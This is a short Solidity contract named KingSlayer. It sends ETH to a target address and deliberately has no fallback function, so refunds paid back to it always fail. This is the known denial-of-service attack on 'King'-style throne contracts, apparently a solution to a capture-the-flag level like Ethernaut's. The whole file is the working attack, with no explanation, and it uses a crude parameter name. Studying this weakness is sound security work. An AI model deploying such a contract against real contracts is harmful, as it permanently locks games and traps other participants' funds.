pragma solidity ^0.4.24;

contract KingSlayer{

    constructor() public {}

    function soupape(address shit) public payable {
        require(shit.call.value(msg.value)());
    }

    // no fallback function lol
    // .call because .send/.transfer doesn't forward gas
}
